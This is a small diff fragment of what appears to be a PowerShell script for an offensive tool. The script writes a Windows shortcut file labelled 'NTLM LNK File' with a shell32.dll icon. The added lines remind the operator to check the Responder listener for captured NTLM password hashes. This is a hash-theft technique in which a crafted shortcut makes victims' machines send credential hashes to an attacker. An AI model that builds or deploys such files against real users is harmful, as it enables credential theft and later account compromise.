@@ -11,3 +11,7 @@ $lnk.WindowStyle = 1
 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
 $lnk.Description = "NTLM LNK File"
 $lnk.Save()
+
+############
+
+Remember to check on the responder side for any captured NTLM password hashes.
